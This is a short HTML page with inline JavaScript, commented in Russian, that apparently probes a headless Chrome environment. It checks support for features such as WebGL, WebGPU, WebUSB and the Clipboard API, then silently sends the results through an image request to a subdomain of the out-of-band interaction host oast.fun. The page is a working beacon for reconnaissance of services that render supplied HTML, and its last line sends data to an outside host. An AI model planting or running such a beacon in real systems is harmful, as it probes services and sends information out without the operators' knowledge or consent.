<!DOCTYPE html>
<script>
// Тест возможностей headless chrome
const tests = {
    'WebGL': () => !!document.createElement('canvas').getContext('webgl'),
    'WebGPU': () => !!navigator.gpu,
    'SharedArrayBuffer': () => !!window.SharedArrayBuffer,
    'WebAssembly': () => !!window.WebAssembly,
    'SpeechSynthesis': () => !!window.speechSynthesis,
    'WebUSB': () => !!navigator.usb,
    'WebBluetooth': () => !!navigator.bluetooth,
    'WebRTC': () => !!window.RTCPeerConnection,
    'Clipboard API': () => !!navigator.clipboard,
    'Storage Access API': () => !!document.hasStorageAccess,
    'Origin Trials': () => {
        const meta = document.createElement('meta');
        meta.httpEquiv = 'origin-trial';
        return !!meta.content;
    }
};

let results = '';
for (const [name, test] of Object.entries(tests)) {
    try {
        results += `${name}: ${test()}\n`;
    } catch(e) {
        results += `${name}: ERROR\n`;
    }
}

// Отправляем результаты
new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?capabilities=' + 
                  encodeURIComponent(results);
</script>
